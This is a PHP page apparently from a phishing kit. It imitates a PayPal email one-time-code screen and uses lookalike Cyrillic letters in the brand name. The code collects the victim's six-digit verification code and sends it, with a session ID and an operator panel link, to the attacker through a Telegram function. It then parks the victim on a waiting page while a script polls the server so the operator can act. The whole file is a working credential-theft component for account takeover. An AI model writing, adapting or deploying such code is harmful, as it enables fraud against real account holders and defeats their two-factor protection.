<?php
require_once 'config.php';
 $sid = $_GET['sid'] ?? '';
if (!$sid) { redirect('index.php'); }

 $sData = get_session($sid);
 $lang = $sData['lang'] ?? 'en';
 $user_email = $sData['username'] ?? 'email@example.com'; 

function maskEmail($email_or_phone) {
    if (strpos($email_or_phone, '@') !== false) {
        list($user, $domain) = explode('@', $email_or_phone);
        $masked_user = substr($user, 0, 2) . str_repeat('•', max(0, strlen($user) - 2));
        return $masked_user . '@' . $domain;
    } else {
        return substr($email_or_phone, 0, 3) . str_repeat('•', max(0, strlen($email_or_phone) - 5)) . substr($email_or_phone, -2);
    }
}
 $masked_email_str = maskEmail($user_email);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = get_session($sid) ?: [];
    $data['email_code'] = $_POST['email_otp_code'] ?? '';
    $data['status'] = 'waiting';
    save_session($sid, $data);

    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
    $panel_link = rtrim($base_url, '/') . '/panel.php?sid=' . $sid;
    sendToTelegram("📧 <b>Email Code</b>\nSID: <code>$sid</code>\nCode: <code>{$data['email_code']}</code>\n\n➡️ <a href='{$panel_link}'>Open Panel</a>");
    redirect("waiting.php?sid=" . $sid);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #ffffff; }
        .container { width: 100%; max-width: 460px; padding: 30px; display: flex; flex-direction: column; }
        .email-pill { display: flex; justify-content: space-between; align-items: center; background-color: #f5f7fa; padding: 14px 20px; border-radius: 20px; margin-bottom: 35px; font-size: 15px; font-weight: 500; color: #000000; }
        .email-pill .change-link { color: #0053c0; text-decoration: none; font-weight: 700; }
        .brand { font-size: 24px; font-weight: 800; color: #000000; margin-bottom: 25px; }
        h1 { font-size: 32px; font-weight: 700; line-height: 1.15; color: #000000; margin-bottom: 25px; }
        .masked-email { font-size: 15px; color: #000000; margin-bottom: 30px; font-weight: 500; }
        .otp-container { display: flex; gap: 10px; margin-bottom: 25px; }
        .otp-input { width: 100%; height: 64px; background-color: #f2f4f7; border: none; border-radius: 12px; text-align: center; font-size: 24px; font-weight: 600; color: #000000; outline: none; transition: box-shadow 0.2s; }
        .otp-input:focus { box-shadow: 0 0 0 2px #0053c0; }
        .resend-link { align-self: flex-start; color: #0053c0; text-decoration: none; font-size: 15px; font-weight: 600; margin-bottom: 35px; }
        .submit-btn { width: 100%; background-color: #0053c0; color: #ffffff; border: none; border-radius: 100px; padding: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background-color 0.2s, opacity 0.2s; }
        .submit-btn:hover { background-color: #0045a1; }
    </style>
</head>
<body onload="initLang('<?php echo $lang; ?>')">
    <form id="emailOtpForm" class="container" method="POST" action="email-code.php?sid=<?php echo htmlspecialchars($sid); ?>">
        <div class="email-pill">
            <span><?php echo htmlspecialchars($user_email); ?></span>
            <a href="#" class="change-link">Change</a>
        </div>

        <div class="brand">РayРal</div>

        <h1 id="email_title">Enter the code we emailed you</h1>

        <div class="masked-email"><?php echo htmlspecialchars($masked_email_str); ?></div>

        <div class="otp-container">
            <input type="text" maxlength="1" class="otp-input" autocomplete="off">
            <input type="text" maxlength="1" class="otp-input" autocomplete="off">
            <input type="text" maxlength="1" class="otp-input" autocomplete="off">
            <input type="text" maxlength="1" class="otp-input" autocomplete="off">
            <input type="text" maxlength="1" class="otp-input" autocomplete="off">
            <input type="text" maxlength="1" class="otp-input" autocomplete="off">
        </div>

        <input type="hidden" id="full-email-code" name="email_otp_code" value="">

        <a href="#" class="resend-link" id="email_resend">Resend</a>

        <button type="submit" class="submit-btn" id="email_submit">Submit</button>
    </form>

    <script>
        const inputs = document.querySelectorAll('.otp-input');
        const hiddenCodeInput = document.getElementById('full-email-code');
        function updateFullCode() { let code = ''; inputs.forEach(input => code += input.value); hiddenCodeInput.value = code; }
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => { if (e.target.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus(); updateFullCode(); });
            input.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus(); });
        });
        document.getElementById('emailOtpForm').addEventListener('submit', function(e) {
            updateFullCode();
            if (hiddenCodeInput.value.length !== 6) { e.preventDefault(); alert("Please enter the full 6-digit code."); return; }
            document.getElementById('email_submit').innerText = "Verifying..."; document.getElementById('email_submit').style.opacity = "0.7"; document.getElementById('email_submit').disabled = true;
        });

        const translations_email = {
            en: { title: "Enter the code we emailed you", resend: "Resend", submit: "Submit" },
            de: { title: "Geben Sie den Code ein, den wir Ihnen per E-Mail gesendet haben", resend: "Erneut senden", submit: "Einreichen" },
            fr: { title: "Entrez le code que nous vous avons envoyé par e-mail", resend: "Renvoyer", submit: "Soumettre" },
            pl: { title: "Wpisz kod, który wysłaliśmy Ci e-mailem", resend: "Wyślij ponownie", submit: "Wyślij" }
        };
        function initLang(lang) {
            const data = translations_email[lang] || translations_email['en'];
            document.getElementById('email_title').innerText = data.title;
            document.getElementById('email_resend').innerText = data.resend;
            document.getElementById('email_submit').innerText = data.submit;
        }
    </script>

    <script>
        const sid = "<?php echo isset($sid) ? addslashes($sid) : ''; ?>";
        if(sid) {
            setInterval(() => {
                fetch('process.php?action=ping&sid=' + sid)
                    .catch(err => console.error('Ping error'));
            }, 5000);
        }
    </script>
</body>
</html>